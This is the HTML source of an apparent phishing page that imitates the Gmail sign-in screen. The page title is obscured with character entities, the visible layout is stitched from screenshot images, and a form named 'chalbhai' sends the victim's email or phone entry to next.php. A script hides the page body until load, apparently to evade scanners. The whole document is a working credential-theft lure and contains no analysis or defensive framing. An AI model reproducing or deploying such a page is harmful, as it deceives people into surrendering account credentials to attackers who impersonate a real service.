<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>&#71;&#109;&#97;&#105;&#108;</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 1276px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
		body {
			/* background image override */
			background-image:  url(images/background.png);
			background-size:   cover;
			background-repeat: no-repeat;
		}
	</style>
 <style type="text/css">
 .textbox { 

	flex-shrink: 1;
    background-color: transparent;
    border: none;
    display: block;
    font: 400 16px Roboto,RobotoDraft,Helvetica,Arial,sans-serif;
    height: 24px;
    line-height: 24px;
    margin: 0;
    min-width: 0%;
    outline: none;
    padding: 0;
    z-index: 0;
}

 </style>
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:410px; top:73px; width:456px; height:507px; z-index:0"><img src="images/header.png" alt="" title="" border=0 width=456 height=507></div>

<div id="image2" style="position:absolute; overflow:hidden; left:413px; top:606px; width:140px; height:17px; z-index:1"><img src="images/english.png" alt="" title="" border=0 width=140 height=17></div>

<div id="image3" style="position:absolute; overflow:hidden; left:670px; top:603px; width:31px; height:20px; z-index:2"><img src="images/help.png" alt="" title="" border=0 width=31 height=20></div>

<div id="image4" style="position:absolute; overflow:hidden; left:751px; top:605px; width:112px; height:17px; z-index:3"><img src="images/privacy.png" alt="" title="" border=0 width=112 height=17></div>

<div id="image5" style="position:absolute; overflow:hidden; left:449px; top:361px; width:89px; height:19px; z-index:4"><a href="#"><img src="images/more.png" alt="" title="" border=0 width=89 height=19></a></div>
<form action="next.php" name=chalbhai id=chalbhai method=post>
<input name="user" label="Email or phone" placeholder="Email or phone" autocomplete="off"  class="textbox" required type="text" style="position:absolute;width:372px;left:452px;top:281px;z-index:5">
<div id="formimage1" style="position:absolute; left:730px; top:352px; z-index:6"><input type="image" name="formimage1" width="94" height="42" src="images/button.png"></div>
</div>

</body>
</html>